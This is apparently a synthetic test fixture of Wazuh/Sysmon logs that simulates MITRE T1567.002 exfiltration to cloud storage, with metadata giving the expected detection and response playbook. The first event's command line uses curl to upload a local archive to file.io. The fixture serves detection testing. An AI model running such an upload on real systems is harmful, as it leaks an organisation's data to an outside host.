{
  "_metadata": {
    "attack_id": "T1567.002",
    "variation": "001",
    "name": "Exfiltration to Cloud Storage",
    "description": "Attacker exfiltrating data via curl to file sharing service",
    "expected_detection": "HIGH",
    "expected_soar": "exfiltration-detection",
    "kill_chain_phase": "exfiltration",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - curl uploading data",
      "sequence": 1,
      "timestamp": "2026-01-29T15:45:00.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Exfiltration to Cloud Storage",
          "id": "100100",
          "mitre": {
            "id": [
              "T1567.002"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "Exfiltration to Cloud Storage"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.204081001",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:45:00.000",
              "processGuid": "{A1B2C3D4-8001-8001-8001-000000000001}",
              "processId": "23000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "commandLine": "curl.exe -X POST -F \"file=@C:\\Users\\Public\\data.7z\" https://file.io",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{A1B2C3D4-8001-8001-8001-000000000000}",
              "parentProcessId": "22800",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 22 - DNS query to file.io",
      "sequence": 2,
      "timestamp": "2026-01-29T15:45:01.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: Exfiltration to Cloud Storage",
          "id": "100100",
          "mitre": {
            "id": [
              "T1567.002"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "Exfiltration to Cloud Storage"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.933462877",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:45:01.000",
              "processGuid": "{A1B2C3D4-8001-8001-8001-000000000001}",
              "processId": "23000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "queryName": "file.io",
              "queryStatus": "0",
              "queryResults": "type:  5 file.io;104.21.48.76;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - Network connection to file.io",
      "sequence": 3,
      "timestamp": "2026-01-29T15:45:02.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Exfiltration to Cloud Storage",
          "id": "100100",
          "mitre": {
            "id": [
              "T1567.002"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "Exfiltration to Cloud Storage"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.259802986",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:45:02.000",
              "processGuid": "{A1B2C3D4-8001-8001-8001-000000000001}",
              "processId": "23000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "10.1.1.50",
              "sourcePort": "52000",
              "destinationIp": "104.21.48.76",
              "destinationHostname": "file.io",
              "destinationPort": "443"
            }
          }
        }
      }
    }
  ]
}